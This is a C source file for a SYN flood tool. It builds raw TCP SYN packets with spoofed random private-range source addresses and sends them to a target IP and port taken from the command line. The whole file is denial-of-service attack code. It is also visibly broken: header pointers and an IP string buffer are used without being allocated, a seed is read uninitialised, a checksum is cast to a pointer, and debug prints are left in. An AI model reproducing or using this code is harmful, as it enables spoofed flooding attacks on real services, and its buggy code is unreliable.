#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#include <sys/types.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <assert.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>

int packet_count = 0;


typedef struct FAKE_Header {
    unsigned int srcIP;
    unsigned int dstIP;
    unsigned char zero;
    unsigned char protocol;
    unsigned short tcp_len;
}FAKE_H;

typedef struct IP_Header {
    unsigned char h_len;
    unsigned char tos;
    unsigned short total_len;
    unsigned short ident;
    unsigned short frag_and_flags;
    unsigned char ttl;
    unsigned char proto;
    unsigned short checksum;
    unsigned int srcIP;
    unsigned int dstIP;
}IP_H;

typedef struct TCP_Header {
    unsigned short sport;
    unsigned short dport;
    unsigned int seq;
    unsigned int ack;
    unsigned char lenres;
    unsigned char flag;
    unsigned short win;
    unsigned short sum;
    unsigned short urp;
}TCP_H;

#define PACKET_SIZE sizeof(IP_H) + sizeof(TCP_H)

int rand_port() {
    return (rand() + 4444) % 9000; 
}

int fastrand(int active){ // Linear Congruential Generator
	if(active){
		unsigned int g_seed = (214013*g_seed+2531011);
		return (g_seed>>16)&0x7FFF;
	}
	return rand();
}

char* rand_ip(int frand){
        printf("here?");

    unsigned char type = rand() % 3, b1, b2, b3;
    char* ipAddress;
    switch(type){
        case 0: //10.0.0.0/8
            b1 = fastrand(frand) & 0xFF; // % 256
            b2 = fastrand(frand) & 0xFF; // % 256
            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
            sprintf(ipAddress, "10.%d.%d.%d", b1, b2, b3);
            printf("here1?");

        break;
        
        case 1: //172.16.0.0/12
            b1 = (fastrand(frand) & 0xF) + 16; // % 16
            b2 = fastrand(frand) & 0xFF; // % 256
            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
            sprintf(ipAddress, "172.%d.%d.%d", b1, b2, b3);
            printf("here?1");
        break;
        
        case 2: //192.168.0.0/16
            b1 = fastrand(frand) & 0xFF; // % 256
            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
            sprintf(ipAddress, "192.168.%d.%d", b1, b3);
            printf("here?1");
        break;
    }
    printf("randIP over...\n");
    return ipAddress;
}


unsigned short check_sum(unsigned short* buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= sizeof(unsigned short);
    }
    if (size) {
        sum += *(unsigned char*) buffer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += sum >> 16;
    return (unsigned short *) (~sum);
}


void syn_flooding (char *srcIP, char *dstIP, int dstPort) {
    srand((unsigned) time(NULL));  
    int flag = 1, s;
    char buffer[PACKET_SIZE];
    struct sockaddr_in sa;
    IP_H *ip_h;
    TCP_H *tcp_h;
    FAKE_H *fake_h;

    printf("asdfasdf\n");
    memset(&buffer, '\0', sizeof(buffer));
    memset(&sa, '0', sizeof(struct sockaddr_in));
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(dstIP);
    sa.sin_port = htons(dstPort);

    s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if ( s < 1 )  {
        perror("Error with socket...");
        exit(1);
    }

    if( setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag)) < 0 ) {
        perror("Error with setsockopt...");
        exit(1);
    }

    // init headers
    ip_h->h_len = 5;
    ip_h->tos = 0;
    ip_h->total_len = htons(PACKET_SIZE);
    ip_h->ident = 1;
    ip_h->frag_and_flags = 0x40;
    ip_h->ttl = 255;
    ip_h->proto = IPPROTO_IP;
    ip_h->checksum = 0;
    ip_h->srcIP = inet_addr(srcIP);
    ip_h->dstIP = inet_addr(dstIP);

    tcp_h->sport = htons(rand_port());
    tcp_h->dport = htons(dstPort);
    tcp_h->seq = 0;
    tcp_h->ack = 0;
    tcp_h->lenres = 0;
    tcp_h->flag = 0x02;
    tcp_h->win = htons(512);
    tcp_h->sum = 0;
    tcp_h->urp = 0;

    fake_h->srcIP = inet_addr(srcIP);
    fake_h->dstIP = inet_addr(dstIP);
    fake_h->zero = 0;
    fake_h->protocol = IPPROTO_TCP;
    fake_h->tcp_len = htons(sizeof(TCP_H));

    memcpy((void*) buffer, (void*) fake_h, sizeof(FAKE_H));
    memcpy((void*) (buffer + sizeof(FAKE_H)), (void*) tcp_h ,sizeof(TCP_H));
    tcp_h->sum = check_sum((unsigned short*) buffer, sizeof(FAKE_H) + sizeof(TCP_H));

    memset(buffer, 0, PACKET_SIZE);
    memcpy((void*) buffer, (void*) ip_h, sizeof(IP_H));
    ip_h->checksum = check_sum( (unsigned short*) buffer, sizeof(IP_H));
    
    memcpy( (void *) (buffer + sizeof(IP_H)), (void *)tcp_h, sizeof(TCP_H));

    if (sendto(s, buffer, ip_h->total_len, 0, (struct sockaddr *) &sa, sizeof(sa)) < 0) {
        perror("failed to send...");
    } else {
        printf("Sent out!! Packet %d ...", ++packet_count);
    }

}

int main (int argc, char* argv[]) {
    srand(time(NULL));
    for (int i = 0; i < 5; i++) {
        printf("%d", argc);
        printf("%s %s\n",argv[0], argv[1]);
        syn_flooding(rand_ip(time(NULL)), argv[1], atoi(argv[2]));
    }
    return 0;
}